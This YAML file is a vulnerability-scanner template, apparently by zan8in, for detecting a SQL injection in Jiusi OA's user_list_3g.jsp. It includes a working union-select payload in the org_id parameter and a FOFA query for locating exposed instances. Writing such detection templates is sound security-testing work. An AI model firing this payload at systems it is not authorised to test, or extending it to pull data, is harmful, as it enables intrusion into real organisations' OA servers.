id: jiusi-oa-userlist3g-sqli

info:
  name: 九思OA软件user_list_3g.jsp存在SQL注入
  author: zan8in
  severity: high
  verified: true
  description: |-
    九思软件为中国高端OA系统知名品牌，九思OA软件user_list_3g.jsp存在SQL注入漏洞
    fofa: app="九思软件-OA"
  reference:
    - https://mp.weixin.qq.com/s/25ZwNEmcLbsmqANVWJPPmw
  tags: jiusi,oa,sqli
  created: 2024/02/28

set:
  randInt: randomInt(100000, 999999)
rules:
  r0:
    request:
      method: GET
      path: /jsoa/wap2/personalMessage/user_list_3g.jsp?userIds=1&userNames=1&content=1&org_id=1%20union/**/select/**/1,md5({{randInt}})%20%23
    expression: response.status == 200 && response.body.bcontains(bytes(md5(string(randInt))))
expression: r0()
